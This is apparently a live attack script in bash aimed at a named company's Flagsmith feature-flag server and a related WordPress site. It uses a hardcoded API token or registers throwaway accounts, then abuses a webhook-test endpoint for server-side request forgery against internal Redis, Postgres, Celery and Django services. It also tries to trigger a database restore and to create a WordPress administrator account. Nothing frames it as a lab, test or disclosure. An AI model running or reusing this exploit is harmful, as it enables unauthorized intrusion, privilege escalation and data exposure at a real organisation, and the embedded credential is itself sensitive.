#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
echo "IP: $(curl -s https://ifconfig.me --max-time 5)"

# Use existing token
KEY="39babf06af373c0b4d524b4b606ea1b247cc094f"
EKEY="Ns2qoxjyttztpwpAJKhNnp"

# Verify token works
R=$(curl -s -w "%{http_code}" "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 2>/dev/null)
CODE=$(echo "$R" | tail -c4)
echo "Token check: $CODE"

if [ "$CODE" != "200" ]; then
  # Need fresh account
  ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
    -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"email\":\"kw-v34-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
  KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
  echo "New key: $KEY"
  # Setup env
  OID=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['id'] if r else '')" 2>/dev/null)
  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"p34\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"e34\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
fi
echo "Env: $EKEY"

ssrf() {
  local URL="$1"
  local LABEL="$2"
  local R=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$URL\",\"secret\":\"\"}" --max-time 30)
  echo "$LABEL -> $R"
}

echo "=== CRITICAL INTERNAL PROBES (short timeout) ==="
# Port 9090 - unknown service
ssrf "http://koinp2p.com:9090/" "9090-root"
ssrf "http://koinp2p.com:9090/metrics" "9090-metrics"

# Redis/Celery
ssrf "http://cache:6379/" "cache-redis"
ssrf "http://redis:6379/" "redis"
ssrf "http://celery:5555/" "celery-flower"

# Postgres
ssrf "http://db:5432/" "db-postgres"
ssrf "http://postgres:5432/" "postgres"

# Django internal admin login
ssrf "http://localhost:8000/admin/login/" "django-login"

# Djoser password reset confirmation (might reveal token format)
ssrf "http://localhost:8000/api/v1/auth/users/reset_password_confirm/" "djoser-reset-confirm"

# Django createsuperuser via custom endpoint (if any)
ssrf "http://localhost:8000/api/v1/users/" "internal-users"
ssrf "http://localhost:8000/api/v1/auth/token/login/" "internal-token-login"

echo "=== WP INTERNAL - NOPRIV AJAX DEEP ==="
# These endpoints read from $_REQUEST (includes $_GET params!)
# UpdraftPlus nopriv restore - try different params
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore&action=updraft_restore&backup_timestamp=1731715200&updraft_restore=db" "restore-with-params"

# WP REST API with different method override
ssrf "http://koinp2p.com/wp-json/wp/v2/users?_method=POST&username=probetest&password=Probe2026!&email=probe@test.com&roles=administrator" "rest-user-method-override"

# WP install.php (check if database needs reinstall)
ssrf "http://koinp2p.com/wp-admin/install.php" "install"

# WP upgrade staging
ssrf "http://koinp2p.com/wp-content/upgrade/" "upgrade-dir"

# Check .htaccess (might reveal rewrite rules that expose internal paths)
ssrf "http://koinp2p.com/.htaccess" "htaccess"

echo "=== DONE ==="
